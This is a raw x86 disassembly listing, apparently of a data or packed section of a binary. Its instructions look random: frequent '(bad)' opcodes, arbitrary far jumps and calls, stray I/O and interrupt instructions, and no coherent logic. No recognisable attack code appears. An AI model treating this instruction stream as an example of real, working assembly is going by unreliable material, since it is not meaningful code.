  4195ce:	xor    DWORD PTR [ebp+0x1e88ff09],ebp
  4195d4:	sub    eax,0xc50e940c
  4195d9:	mov    al,0xe4
  4195db:	adc    BYTE PTR [ebx+0x4],dl
  4195de:	push   es
  4195df:	retf   
  4195e0:	jae    0x4195c3
  4195e2:	sbb    BYTE PTR [ebp+0x6e],0xe7
  4195e6:	or     dl,cl
  4195e8:	xchg   esi,eax
  4195e9:	fisubr WORD PTR [ecx+ebp*1-0x37]
  4195ed:	test   BYTE PTR [ebp-0x649e82d4],bh
  4195f3:	ins    DWORD PTR es:[edi],dx
  4195f4:	dec    ebx
  4195f5:	rcr    BYTE PTR [eax-0x19501707],1
  4195fb:	mov    dl,0x96
  4195fd:	xchg   edx,eax
  4195fe:	mov    bh,0xa5
  419600:	test   BYTE PTR [edi+0x6f],0x25
  419604:	xchg   edx,eax
  419605:	pop    ebp
  419606:	or     ecx,edx
  419608:	sub    bl,dh
  41960a:	add    dl,dh
  41960c:	sub    ebx,esi
  41960e:	jns    0x41965a
  419610:	push   es
  419611:	sub    BYTE PTR [esi],bh
  419613:	cmp    eax,0x35
  419616:	ds dec eax
  419618:	push   es
  419619:	cmp    dl,ah
  41961b:	push   ebx
  41961c:	mov    al,0xdd
  41961e:	pop    ss
  41961f:	mov    WORD PTR [eax+eax*2],es
  419622:	dec    ecx
  419623:	pusha  
  419624:	push   esp
  419625:	and    dl,BYTE PTR [edi-0x5061a995]
  41962b:	fwait
  41962c:	ds dec edx
  41962e:	push   esp
  41962f:	call   0x9a13:0xa93ae85b
  419636:	and    BYTE PTR [eax+0x5f],0x1f
  41963a:	xor    DWORD PTR [ebp-0x65254555],eax
  419640:	xor    ecx,ebx
  419642:	ins    DWORD PTR es:[edi],dx
  419643:	cli    
  419644:	fidiv  DWORD PTR [eax-0x57f49530]
  41964a:	fst    QWORD PTR [eax]
  41964c:	xlat   BYTE PTR ds:[ebx]
  41964d:	push   ebp
  41964e:	push   es
  41964f:	int    0x14
  419651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419652:	fdiv   DWORD PTR [ebp+eiz*4+0x24e8231e]
  419659:	jae    0x419657
  41965b:	ins    DWORD PTR es:[edi],dx
  41965c:	pop    edi
  41965d:	bound  ecx,QWORD PTR [eax]
  41965f:	leave  
  419660:	jbe    0x4196bf
  419662:	mov    ebp,0xa8b504ce
  419667:	xchg   esp,eax
  419668:	cmp    DWORD PTR [ebp-0x5f9c8028],eax
  41966e:	into   
  41966f:	ret    
  419670:	call   FWORD PTR [edx]
  419672:	lods   al,BYTE PTR ds:[esi]
  419673:	fldenv [ecx]
  419675:	stc    
  419676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419677:	lea    edx,[ecx-0x53e69b4f]
  41967d:	and    ecx,DWORD PTR [eax]
  41967f:	sbb    eax,0x1c5c2a77
  419684:	mov    cl,0x4f
  419686:	sbb    DWORD PTR [ecx],esp
  419688:	ins    BYTE PTR es:[edi],dx
  419689:	mov    bh,0xbe
  41968b:	in     al,0xd1
  41968d:	out    dx,eax
  41968e:	adc    edi,DWORD PTR [ebp+eax*1-0x35]
  419692:	or     BYTE PTR [ecx-0x13],ah
  419695:	xor    al,0xb6
  419697:	test   eax,0x942ad431
  41969c:	sbb    eax,eax
  41969e:	xor    cl,BYTE PTR [edi+0x21d64653]
  4196a4:	mov    ebp,0xa02318e1
  4196a9:	cmp    bl,ch
  4196ab:	jo     0x419724
  4196ad:	xlat   BYTE PTR ds:[ebx]
  4196ae:	dec    edx
  4196af:	add    al,0x12
  4196b1:	xchg   DWORD PTR [esi],edi
  4196b3:	ret    0xa335
  4196b6:	enter  0x4214,0xb9
  4196ba:	icebp  
  4196bb:	bnd jge 0x4196e7
  4196be:	retf   
  4196bf:	popf   
  4196c0:	mov    dh,0x30
  4196c2:	(bad)  
  4196c3:	lods   eax,DWORD PTR ds:[esi]
  4196c4:	mov    ecx,0xc0110f0d
  4196c9:	inc    esi
  4196ca:	int    0xf7
  4196cc:	out    0x5f,eax
  4196ce:	leave  
  4196cf:	int    0x51
  4196d1:	xor    al,0x2
  4196d3:	add    BYTE PTR [esi-0x50],bl
  4196d6:	xor    ah,BYTE PTR [ebp+0x7]
  4196d9:	adc    al,0x7
  4196db:	ret    
  4196dc:	jae    0x419682
  4196de:	mov    ebx,0x7177c76e
  4196e3:	clc    
  4196e4:	ret    0xfd5a
  4196e7:	add    eax,DWORD PTR [ecx+0x578d5661]
  4196ed:	test   BYTE PTR ds:0x2986c5a5,al
  4196f3:	mov    ds:0x5873d570,eax
  4196f8:	loop   0x4196ad
  4196fa:	mov    ebp,0x2691d4ad
  4196ff:	dec    esp
  419700:	add    DWORD PTR [eax+0x1f],eax
  419703:	sub    al,0x4
  419705:	and    DWORD PTR [edx-0x2b2ffcdd],edi
  41970b:	cmp    ebx,ecx
  41970d:	mov    es,WORD PTR [edx-0x34]
  419710:	mov    dh,0x84
  419712:	pop    ebp
  419713:	dec    ebx
  419714:	xor    cl,ah
  419716:	adc    BYTE PTR [edi+0x38],dh
  419719:	cmp    DWORD PTR [ecx],esi
  41971b:	xor    ch,al
  41971d:	sub    ebp,DWORD PTR [eax]
  41971f:	rcr    BYTE PTR [ecx+0x17ba894],cl
  419725:	inc    edx
  419726:	jb     0x419703
  419728:	xlat   BYTE PTR ds:[ebx]
  419729:	adc    esi,edx
  41972b:	push   esp
  41972c:	dec    eax
  41972d:	fisubr WORD PTR [ecx]
  41972f:	aaa    
  419730:	dec    DWORD PTR [ebp+0x7e]
  419733:	pusha  
  419734:	sub    DWORD PTR [edx+0x5d430c05],ecx
  41973a:	push   esp
  41973b:	scas   eax,DWORD PTR es:[edi]
  41973c:	or     DWORD PTR [ecx],ecx
  41973e:	scas   al,BYTE PTR es:[edi]
  41973f:	jmp    0xd2a6:0x56eb67b4
  419746:	leave  
  419747:	hlt    
  419748:	adc    edi,DWORD PTR [edx+esi*8]
  41974b:	daa    
  41974c:	sbb    ebx,DWORD PTR [edi-0x10f55d4f]
  419752:	inc    eax
  419753:	add    al,dh
  419755:	lods   eax,DWORD PTR ds:[esi]
  419756:	jne    0x419701
  419758:	ss jnp 0x41972a
  41975b:	mov    ebp,0x80bab539
  419760:	pop    edx
  419761:	mov    ah,0x3e
  419763:	shl    BYTE PTR [ebx-0x69],0x93
  419767:	gs jo  0x419748
  41976a:	outs   dx,BYTE PTR ds:[esi]
  41976b:	stc    
  41976c:	call   0x50983418
  419771:	ja     0x41978e
  419773:	pop    ebx
  419774:	jg     0x419751
  419776:	clc    
  419777:	sub    al,0xf1
  419779:	(bad)  
  41977a:	dec    edi
  41977b:	fist   DWORD PTR [ebx]
  41977d:	retf   0x4084
  419780:	in     al,0xdf
  419782:	gs ss mov ecx,fs
  419786:	ins    DWORD PTR es:[edi],dx
  419787:	xadd   BYTE PTR [esi+ecx*8],bh
  41978b:	popa   
  41978c:	add    bl,BYTE PTR [edx+0x68fc906d]
  419792:	shr    edx,1
  419794:	stos   BYTE PTR es:[edi],al
  419795:	and    bl,BYTE PTR [esi-0x64]
  419798:	not    DWORD PTR [ecx+ecx*8+0x40]
  41979c:	inc    ebx
  41979d:	sub    eax,0xe61bf82b
  4197a2:	stc    
  4197a3:	je     0x419796
  4197a5:	pop    esp
  4197a6:	into   
  4197a7:	add    bl,ah
  4197a9:	mov    BYTE PTR [esp+ecx*1],ch
  4197ac:	iret   
  4197ad:	dec    ebx
  4197ae:	imul   esp,DWORD PTR ds:0xe3535256,0x2f
  4197b5:	push   0xac698299
  4197ba:	pop    ebp
  4197bb:	cmc    
  4197bc:	out    0xfc,al
  4197be:	jmp    0x5d17:0x13b6a26b
  4197c5:	loopne 0x419821
  4197c7:	xchg   ebp,eax
  4197c8:	stos   BYTE PTR es:[edi],al
  4197c9:	jb     0x41975c
  4197cb:	jae    0x419792
  4197cd:	push   0x7e3a087e
  4197d2:	js     0x419825
  4197d4:	repz add eax,0xa0abdbd
  4197da:	shr    DWORD PTR [esi-0x48],cl
  4197dd:	mov    cl,0xf6
  4197df:	aaa    
  4197e0:	and    BYTE PTR ds:0x6c33629c,al
  4197e6:	add    al,0x1e
  4197e8:	lock loop 0x419774
  4197eb:	sbb    ah,bh
  4197ed:	or     eax,0x2e5eba44
  4197f2:	clc    
  4197f3:	mov    bl,0x44
  4197f5:	add    bl,0x1f
  4197f8:	rcr    DWORD PTR [esi+0xdefdc7e],1
  4197fe:	mov    WORD PTR [esi+0x3a],?
  419801:	loope  0x4197d5
  419803:	arpl   WORD PTR es:[ecx+0x26],ax
  419807:	xchg   ebx,eax
  419808:	push   ds
  419809:	ret    
  41980a:	ss xchg edx,eax
  41980c:	sub    edx,DWORD PTR [eax-0x7c]
  41980f:	mov    WORD PTR [esi],?
  419811:	xchg   BYTE PTR [ecx],cl
  419813:	sbb    ebp,0x2e237676
  419819:	sti    
  41981a:	push   cs
  41981b:	mov    ebp,0xc7dee99a
  419820:	fstp   TBYTE PTR [ebx-0x4acddf2e]
  419826:	sbb    DWORD PTR [ebx],esp
  419828:	push   edx
  419829:	sub    DWORD PTR [esi],0x4
  41982c:	jl     0x4198a0
  41982e:	mov    bl,0x81
  419830:	adc    ebx,DWORD PTR [edx+edx*2+0x7e6eb972]
  419837:	aaa    
  419838:	add    al,BYTE PTR [eax-0x4f]
  41983b:	loop   0x419848
  41983d:	and    eax,0xd0faf71d
  419842:	jbe    0x4198bf
  419844:	mov    ebx,0x1974a312
  419849:	cmp    DWORD PTR [ebp-0x4f],eax
  41984c:	mov    al,ds:0x4bdbd5b0
  419851:	adc    eax,0x34e92763
  419856:	shl    BYTE PTR [ecx],0x1c
  419859:	in     al,dx
  41985a:	cmc    
  41985b:	xchg   ecx,eax
  41985c:	sub    BYTE PTR [ebp+0x772bc31b],ah
  419862:	inc    ebx
  419863:	sti    
  419864:	shl    DWORD PTR [edx+ebp*4+0x7c002da6],1
  41986b:	or     esp,DWORD PTR [ecx]
  41986d:	sbb    edx,DWORD PTR fs:[ecx+0x47]
  419871:	add    bh,BYTE PTR [edx]
  419873:	push   edi
  419874:	xor    eax,0xa1b9feee
  419879:	gs xchg edi,eax
  41987b:	test   al,0xcd
  41987d:	(bad)  
  41987e:	rcl    BYTE PTR [esi-0x1ca4fa25],cl
  419884:	loopne 0x419832
  419886:	les    ebp,FWORD PTR [ebx]
  419888:	std    
  419889:	int3   
  41988a:	mov    dl,0x99
  41988c:	and    ah,BYTE PTR [edx+0x1c792e0f]
  419892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419893:	push   cs
  419894:	sbb    BYTE PTR [ebx-0x7b994f68],ah
  41989a:	hlt    
  41989b:	mov    bh,0xce
  41989d:	jge    0x41991d
  41989f:	(bad)  
  4198a0:	cdq    
  4198a1:	das    
  4198a2:	pop    eax
  4198a3:	dec    edx
  4198a4:	pushw  0x5f
  4198a7:	data16 and al,0xf2
  4198aa:	pop    ebx
  4198ab:	fabs   
  4198ad:	sbb    BYTE PTR [edx+0x29],bh
  4198b0:	cmp    bl,0x76
  4198b3:	scas   eax,DWORD PTR es:[edi]
  4198b4:	push   edx
  4198b5:	in     eax,dx
  4198b6:	xchg   ebp,eax
  4198b7:	pop    es
  4198b8:	mov    ah,0xd6
  4198ba:	push   edi
  4198bb:	pop    ss
  4198bc:	add    ch,BYTE PTR ds:0x9f704ed5
  4198c2:	ret    0x59ac
  4198c5:	sbb    eax,DWORD PTR [edi]
  4198c7:	fisub  DWORD PTR [edx]
  4198c9:	pop    edx
  4198ca:	out    0x3d,eax
  4198cc:	aad    0xcf
  4198ce:	sbb    eax,0xb37569d7
  4198d3:	pop    edi
  4198d4:	jnp    0x4198b9
  4198d6:	push   cs
  4198d7:	ficomp DWORD PTR [eax-0x7b]
  4198da:	mov    dl,0x90
  4198dc:	outs   dx,BYTE PTR ds:[esi]
  4198dd:	bswap  edx
  4198df:	imul   edx,DWORD PTR [esp+ecx*2-0x28],0xe8cd181f
  4198e7:	push   edi
  4198e8:	lods   al,BYTE PTR ds:[esi]
  4198e9:	or     eax,DWORD PTR [ebx]
  4198eb:	inc    edx
  4198ec:	and    eax,0x782dc6ab
  4198f1:	cmp    BYTE PTR [edx+0x35ed25c9],cl
  4198f7:	xchg   ebp,eax
  4198f8:	ins    DWORD PTR es:[edi],dx
  4198f9:	and    ch,BYTE PTR [ebp+0x12]
  4198fc:	push   esi
  4198fd:	and    DWORD PTR [edx],ecx
  4198ff:	cmp    ebx,DWORD PTR [eax-0x798ab07d]
  419905:	sub    dl,BYTE PTR [ebp+0x1c]
  419908:	xor    eax,0x93e07041
  41990d:	and    al,0x19
  41990f:	add    DWORD PTR es:[edi],ebx
  419912:	outs   dx,BYTE PTR ds:[esi]
  419913:	push   edx
  419914:	(bad)  
  419915:	popa   
  419916:	(bad)
  419919:	add    bl,BYTE PTR [ecx+0x23dfc56]
  41991f:	or     DWORD PTR [edx-0x5e],ebp
  419922:	pop    es
  419923:	mov    ebx,0x68dfcf76
  419928:	mov    esi,0xedaa8bb1
  41992d:	ins    DWORD PTR es:[edi],dx
  41992e:	push   0x4e1cbd81
  419933:	retf   0x341f
  419936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419937:	pop    ds
  419938:	cld    
  419939:	mov    ch,0x35
  41993b:	and    bl,BYTE PTR [ebx-0x7f056ea3]
  419941:	js     0x41995a
  419943:	push   cs
  419944:	test   BYTE PTR [esi],ch
  419946:	test   al,0xeb
  419948:	push   ebp
  419949:	mov    al,ds:0xf037fc7f
  41994e:	les    esi,FWORD PTR [esi]
  419950:	add    dh,BYTE PTR [ebx-0x55bf9a52]
  419956:	xchg   ecx,eax
  419957:	dec    ecx
  419958:	bound  ebp,QWORD PTR [esi-0x7e230b64]
  41995e:	ja     0x419973
  419960:	fist   DWORD PTR [ecx-0x5fdf2fb6]
  419966:	les    edi,FWORD PTR [edi-0x2a]
  419969:	gs xchg edi,eax
  41996b:	sbb    BYTE PTR [ecx+ebp*1+0x6367c020],0x1f
  419973:	sbb    al,0x71
  419975:	into   
  419976:	cli    
  419977:	enter  0x1e6e,0x5b
  41997b:	shl    DWORD PTR [edx-0x6f124323],0x55
  419982:	fcom   DWORD PTR [edi-0x7e5122de]
  419988:	adc    cl,bl
  41998a:	mov    esp,esi
  41998c:	mov    ?,WORD PTR [edi+esi*8-0x62]
  419990:	and    ecx,esp
  419992:	jg     0x419958
  419994:	and    eax,0x3b1b5010
  419999:	cmp    DWORD PTR [esp],0xffffffc5
  41999d:	dec    esi
  41999e:	int3   
  41999f:	xor    ah,BYTE PTR [esi+0x14]
  4199a2:	xor    ebp,esi
  4199a4:	push   edx
  4199a5:	xor    bl,ah
  4199a7:	and    dh,BYTE PTR [esi]
  4199a9:	push   cs
  4199aa:	dec    ebp
  4199ab:	jmp    0x1e1c:0x94b61486
  4199b2:	adc    bl,BYTE PTR [esp]
  4199b5:	mov    al,0x1a
  4199b7:	add    al,0x4b
  4199b9:	jecxz  0x41993c
  4199bb:	sbb    al,BYTE PTR ds:0x6992fc62
  4199c1:	fs mov esi,0x103d59e4
  4199c7:	add    BYTE PTR [ecx+0x71d5f4b9],bl
  4199cd:	xor    al,0x1f
  4199cf:	cmp    eax,DWORD PTR [edx+0x1e]
  4199d2:	call   0xdd0b:0xa2df4ba1
  4199d9:	xor    BYTE PTR [eax],dh
  4199db:	int3   
  4199dc:	or     edx,DWORD PTR [esi+0x56]
  4199df:	fs or  eax,0x3555b02f
  4199e5:	xchg   edx,eax
  4199e6:	out    dx,al
  4199e7:	pop    es
  4199e8:	and    al,BYTE PTR [edi-0x389eb237]
  4199ee:	or     eax,0x6e609347
  4199f3:	mov    ds:0x286382,eax
  4199f8:	sub    eax,0x7ee7fbce
  4199fd:	outs   dx,BYTE PTR ds:[esi]
  4199fe:	mov    ds:0xe4e4c155,al
  419a03:	js     0x419a6d
  419a05:	fadd   DWORD PTR [ebx-0x1141b52f]
  419a0b:	das    
  419a0c:	das    
  419a0d:	fs xchg ebx,eax
  419a0f:	or     al,BYTE PTR [edi]
  419a11:	sbb    eax,0x9e19a339
  419a16:	sbb    ecx,0x7ae5ba
  419a1c:	push   edx
  419a1d:	and    edi,DWORD PTR [eax+eax*4-0x6a]
  419a21:	add    BYTE PTR [edx],bh
  419a23:	or     bl,BYTE PTR [esi+0x4db603b1]
  419a29:	aad    0xe2
  419a2b:	mov    dl,0x3d
  419a2d:	scas   eax,DWORD PTR es:[edi]
  419a2e:	mov    edx,0x7de03937
  419a33:	out    dx,eax
  419a34:	fnsave [eax]
  419a36:	mov    ds:0x1819aa18,al
  419a3b:	div    DWORD PTR [edx]
  419a3d:	sahf   
  419a3e:	add    eax,0xc1baaf19
  419a43:	adc    esi,esp
  419a45:	sbb    eax,0x77bdb363
  419a4a:	sar    BYTE PTR [esi+esi*1+0x7a9aabf3],1
  419a51:	sub    ebx,0xad19d603
  419a57:	aad    0x2d
  419a59:	out    0x19,eax
  419a5b:	int    0xe
  419a5d:	push   ds
  419a5e:	scas   al,BYTE PTR es:[edi]
  419a5f:	mov    al,0xaf
  419a61:	xchg   ecx,eax
  419a62:	loop   0x419a77
  419a64:	data16 int 0x63
  419a67:	mov    ds:0x78a92cfd,al
  419a6c:	(bad)  
  419a6d:	add    ebp,ebp
  419a6f:	xchg   esi,eax
  419a70:	cwde   
  419a71:	inc    ecx
  419a72:	(bad)  
  419a73:	std    
  419a74:	arpl   ax,bp
  419a76:	xor    al,0x2f
  419a78:	repnz or eax,0x7bf745f6
  419a7e:	cdq    
  419a7f:	mov    bl,0xbc
  419a81:	inc    eax
  419a82:	hlt    
  419a83:	sbb    eax,0x82074480
  419a88:	mov    dl,0xb0
  419a8a:	in     eax,dx
  419a8b:	sbb    ebp,DWORD PTR [esi-0x45c736ab]
  419a91:	shr    edx,cl
  419a93:	inc    esp
  419a94:	sbb    BYTE PTR [edx-0x20],dh
  419a97:	inc    ax
  419a99:	aam    0x17
  419a9b:	fdivp  st(2),st
  419a9d:	dec    edx
  419a9e:	and    eax,0xbeb7c9dd
  419aa3:	aas    
  419aa4:	ins    DWORD PTR es:[edi],dx
  419aa5:	jmp    0xfefa9825
  419aaa:	mov    eax,ds:0x5e27c95e
  419aaf:	push   ebx
  419ab0:	pop    ss
  419ab1:	sbb    al,0x46
  419ab3:	add    al,0xc
  419ab5:	inc    esi
  419ab6:	aad    0xaf
  419ab8:	xchg   edx,eax
  419ab9:	inc    edi
  419aba:	inc    esp
  419abb:	sahf   
  419abc:	push   esi
  419abd:	add    al,0x78
  419abf:	popa   
  419ac0:	and    DWORD PTR [eax-0x21],ecx
  419ac3:	pop    esp
  419ac4:	or     ch,dh
  419ac6:	mov    esp,0xef15383c
  419acb:	retf   
  419acc:	adc    DWORD PTR ds:0x784b31d6,ecx
  419ad2:	jge    0x419aa6
  419ad4:	xor    eax,0x34653356
  419ad9:	jle    0x419a8b
  419adb:	(bad)  
  419adc:	std    
  419add:	or     BYTE PTR [esi+0x44],bh
  419ae0:	hlt    
  419ae1:	retf   
  419ae2:	out    dx,eax
  419ae3:	in     eax,0xe4
  419ae5:	std    
  419ae6:	pop    ecx
  419ae7:	cdq    
  419ae8:	clc    
  419ae9:	mov    ebp,0xf89b8ec
  419aee:	dec    esi
  419aef:	retf   
  419af0:	adc    DWORD PTR [eax],0xffffffe3
  419af3:	daa    
  419af4:	iret   
  419af5:	(bad)  
  419af6:	push   ebx
  419af7:	imul   dx,WORD PTR ss:[eax],0xa
  419afc:	mov    dh,0x80
  419afe:	cld    
  419aff:	aas    
  419b00:	xor    al,0xa2
  419b02:	mov    edi,0x6ea4f0f3
  419b07:	dec    ebp
  419b08:	mov    ds:0x5f3ec11d,al
  419b0d:	add    esp,edx
  419b0f:	add    bl,BYTE PTR [ecx-0x3f]
  419b12:	inc    eax
  419b13:	sar    DWORD PTR [edx-0x7a],0x1c
  419b17:	xchg   esi,eax
  419b18:	(bad)  
  419b19:	push   edi
  419b1a:	icebp  
  419b1b:	ss das 
  419b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b1e:	sbb    DWORD PTR ds:0xd441ffd2,edi
  419b24:	stos   BYTE PTR es:[edi],al
  419b25:	mov    ebx,0x6e837358
  419b2a:	mov    esp,0x4a1e2d98
  419b2f:	aad    0x5e
  419b31:	mov    cl,BYTE PTR [edx+eax*8+0x4ce9bf2b]
  419b38:	and    al,0xba
  419b3a:	push   es
  419b3b:	push   ebx
  419b3c:	(bad)  
  419b3d:	fldcw  WORD PTR [ebp+ecx*4+0x27a30cb3]
  419b44:	int    0xc9
  419b46:	daa    
  419b47:	cmp    BYTE PTR [edx+0x8a3510d],0x3e
  419b4e:	mov    ebp,0x15c9f5e0
  419b53:	sub    bh,BYTE PTR [ecx]
  419b55:	fdivr  QWORD PTR [edi-0x245e79e2]
  419b5b:	gs ja  0x419b24
  419b5e:	mov    BYTE PTR [eax+0x3255c1b6],bh
  419b64:	fbstp  TBYTE PTR [ecx+esi*1]
  419b67:	aas    
  419b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b69:	cld    
  419b6a:	push   eax
  419b6b:	dec    ebx
  419b6c:	hlt    
  419b6d:	fs data16 adc al,0xbc
  419b71:	dec    ebp
  419b72:	mov    ds:0xc38384ae,eax
  419b77:	xor    BYTE PTR [esi+0x1bec1a67],ch
  419b7d:	sbb    al,ah
  419b7f:	icebp  
  419b80:	jg     0x419b58
  419b82:	xchg   ebx,eax
  419b83:	gs dec ebp
  419b85:	jnp    0x419bd6
  419b87:	ja     0x419b3e
  419b89:	mov    al,0xf6
  419b8b:	fwait
  419b8c:	loopne 0x419b6a
  419b8e:	mov    esi,0xddb87b18
  419b93:	ins    DWORD PTR es:[edi],dx
  419b94:	add    DWORD PTR [eax-0x57bc35bc],eax
  419b9a:	jg     0x419bd3
  419b9c:	in     al,dx
  419b9d:	sbb    dl,BYTE PTR [ecx+0x6e4e41c]
  419ba3:	mov    edx,0xda80c047
  419ba8:	xor    eax,edx
  419baa:	sahf   
  419bab:	bound  ebx,QWORD PTR [edx+ebp*8+0x576632e]
  419bb2:	xchg   edx,eax
  419bb3:	xor    BYTE PTR [esp+0x5188febf],ch
  419bba:	sub    dh,bh
  419bbc:	test   al,0x6d
  419bbe:	xbegin 0x845e3e1e
  419bc4:	cwde   
  419bc5:	sub    ebx,DWORD PTR [eax]
  419bc7:	and    al,0xf5
  419bc9:	sti    
  419bca:	pop    eax
  419bcb:	nop
  419bcc:	int    0x13
  419bce:	mov    ebp,0x38f2e598
  419bd3:	inc    esi
  419bd4:	jb     0x419b5f
  419bd6:	push   eax
  419bd7:	dec    ebp
  419bd8:	and    eax,0xd8d6a288
  419bdd:	lock cld 
  419bdf:	sar    ah,cl
  419be1:	rep lods eax,DWORD PTR ds:[esi]
  419be3:	nop
  419be4:	and    ch,BYTE PTR gs:[edx]
  419be7:	loope  0x419b7d
  419be9:	dec    esp
  419bea:	dec    eax
  419beb:	and    eax,DWORD PTR [esi-0x57]
  419bee:	jns    0x419b7e
  419bf0:	stc    
  419bf1:	(bad)  
  419bf2:	cdq    
  419bf3:	lea    ecx,ds:0xe922859c
  419bf9:	sub    BYTE PTR [ebx],dl
  419bfb:	cmp    cl,al
  419bfd:	cwde   
  419bfe:	je     0x419c2e
  419c00:	aam    0x35
  419c02:	and    BYTE PTR [esi],0x7b
  419c05:	test   eax,0x9ef1852b
  419c0a:	and    esp,DWORD PTR [eax+0x56]
  419c0d:	push   edi
  419c0e:	mov    DWORD PTR [edi],ebp
  419c10:	mov    bl,0x3c
  419c12:	adc    ecx,DWORD PTR [ebx]
  419c14:	inc    ebp
  419c15:	xchg   DWORD PTR [ebp+0x5f6ed16f],ebp
  419c1b:	clc    
  419c1c:	sbb    al,0x12
  419c1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c1f:	repnz and al,0x47
  419c22:	mov    edi,DWORD PTR [ebx-0x69ecc933]
  419c28:	popa   
  419c29:	popf   
  419c2a:	dec    eax
  419c2b:	mov    ebp,0x64b92b4d
  419c30:	rcl    ch,1
  419c32:	mov    eax,0x2f9a56b2
  419c37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c38:	mov    eax,ds:0xe8b2bb5
  419c3d:	das    
  419c3e:	cs jle 0x419bcb
  419c41:	imul   edi,DWORD PTR [edi+edi*8+0x39cbbe99],0x8
  419c49:	xchg   ebp,eax
  419c4a:	pop    ebp
  419c4b:	inc    ebp
  419c4c:	mov    al,0x9
  419c4e:	dec    bp
  419c50:	in     al,0x93
  419c52:	je     0x419bf6
  419c54:	mov    edi,0x549aaf1a
  419c59:	nop
  419c5a:	rol    BYTE PTR [eax-0xa],1
  419c5d:	bound  edi,QWORD PTR [edx]
  419c5f:	(bad)  
  419c60:	sub    eax,0xc457d22c
  419c65:	jnp    0x419c19
  419c67:	out    dx,eax
  419c68:	jmp    0xf334:0xa4eaddf6
  419c6f:	adc    al,cl
  419c71:	leave  
  419c72:	int    0xb8
  419c74:	clc    
  419c75:	and    eax,0xe1beba3f
  419c7a:	fs pop di
  419c7d:	ret    0x4cbf
  419c80:	xchg   ebp,eax
  419c81:	xor    ch,al
  419c83:	mov    eax,0xb378e068
  419c88:	mov    al,0xb2
  419c8a:	jnp    0x419cc2
  419c8c:	cli    
  419c8d:	icebp  
  419c8e:	mov    cs,WORD PTR [edx+0x18775439]
  419c94:	das    
  419c95:	in     eax,0xa
  419c97:	add    edi,DWORD PTR [ebx]
  419c99:	add    BYTE PTR [eax+edi*8-0x2c],0x81
  419c9e:	add    bh,BYTE PTR [ebx]
  419ca0:	mov    ebp,0xd8f2717c
  419ca5:	pop    esp
  419ca6:	push   esi
  419ca7:	imul   ecx,DWORD PTR [ecx-0x4ec19a70],0xaff41a4e
  419cb1:	popa   
  419cb2:	pusha  
  419cb3:	retf   
  419cb4:	sub    al,BYTE PTR [edi]
  419cb6:	mov    edx,0x6f1967a8
  419cbb:	mov    edi,0x68435539
  419cc0:	or     ecx,edi
  419cc2:	fnstenv [eax+0x3c]
  419cc5:	das    
  419cc6:	mov    al,BYTE PTR [esi]
  419cc8:	push   ebx
  419cc9:	and    ebx,DWORD PTR [esi+0x1bef131b]
  419ccf:	rcl    BYTE PTR [esi+eiz*8],1
  419cd2:	and    edi,DWORD PTR [edi]
  419cd4:	dec    BYTE PTR [ebx]
  419cd6:	mov    dh,0x0
  419cd8:	jae    0x419ce0
  419cda:	(bad)
  419cdf:	or     DWORD PTR [ebx+0x61],esi
  419ce2:	jmp    0xb16a1a65
  419ce7:	mov    ebp,0x1edfb0ae
  419cec:	sti    
  419ced:	lods   eax,DWORD PTR ds:[esi]
  419cee:	add    dh,ah
  419cf0:	adc    esp,edi
  419cf2:	std    
  419cf3:	dec    ecx
  419cf4:	repz inc ebp
  419cf6:	retf   
  419cf7:	or     ah,cl
  419cf9:	sbb    esp,DWORD PTR [eax+0x79a4c020]
  419cff:	mov    edx,ebx
  419d01:	stc    
  419d02:	dec    edx
  419d03:	mov    ds:0x55d2898a,al
  419d08:	sbb    dh,BYTE PTR [eax]
  419d0a:	cmp    eax,0x5b4f7a4b
  419d0f:	add    DWORD PTR [edx-0x25bd4adf],edx
  419d15:	call   0xbd5cc8a9
  419d1a:	retf   
  419d1b:	cmp    BYTE PTR [ebp-0x72],ch
  419d1e:	push   ss
  419d1f:	iretw  
  419d21:	loop   0x419d85
  419d23:	sub    edi,ebp
  419d25:	shl    BYTE PTR [ebp+0x4],1
  419d28:	outs   dx,DWORD PTR ds:[esi]
  419d29:	and    al,0x7b
  419d2b:	arpl   WORD PTR [eax],sp
  419d2d:	add    esp,ebp
  419d2f:	scas   al,BYTE PTR es:[edi]
  419d30:	mov    dh,0xc4
  419d32:	sub    bh,BYTE PTR [ebp-0x65]
  419d35:	xchg   BYTE PTR [edx+0x3e],al
  419d38:	or     DWORD PTR [edx],esi
  419d3a:	out    dx,eax
  419d3b:	mov    ebp,0xd263c7e6
  419d40:	mov    edx,eax
  419d42:	inc    edi
  419d43:	jl     0x419d7c
  419d45:	lea    eax,[eax+0x7eb7f41]
  419d4b:	mov    ds:0x81ac6431,al
  419d50:	xor    cl,BYTE PTR [esi]
  419d52:	mov    bh,0x49
  419d54:	sub    BYTE PTR [ecx-0x3c],cl
  419d57:	int    0xa5
  419d59:	shl    BYTE PTR [ecx-0x7c1dc08c],0x77
  419d60:	shr    bh,cl
  419d62:	je     0x419da6
  419d64:	jp     0x419da5
  419d66:	cmp    DWORD PTR [edi-0x28061446],ecx
  419d6c:	or     DWORD PTR [ebx],0x6b
  419d6f:	jle    0x419cf4
  419d71:	pushf  
  419d72:	push   es
  419d73:	int3   
  419d74:	adc    DWORD PTR [ebp+0x40e52a10],esp
  419d7a:	jecxz  0x419dbf
  419d7c:	jmp    0x71e65e27
  419d81:	mov    bh,0xa7
  419d83:	mov    ebx,0xe62b9365
  419d88:	xchg   ebp,eax
  419d89:	push   edx
  419d8a:	retf   
  419d8b:	inc    esi
  419d8c:	xchg   BYTE PTR [ebx],ah
  419d8e:	cs push edx
  419d90:	call   0x6543:0x9987b4a2
  419d97:	enter  0x1f57,0x9d
  419d9b:	jg     0x419d4f
  419d9d:	out    0x2f,eax
  419d9f:	sar    dh,cl
  419da1:	sub    edi,eax
  419da3:	sub    ebx,DWORD PTR [esp+eax*1]
  419da6:	mov    WORD PTR [ebx+0x36d81c40],ds
  419dac:	ret    
  419dad:	out    dx,eax
  419dae:	or     DWORD PTR [esp+ebx*4+0xc879454],esi
  419db5:	inc    esi
  419db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419db7:	adc    al,0xba
  419db9:	pop    esp
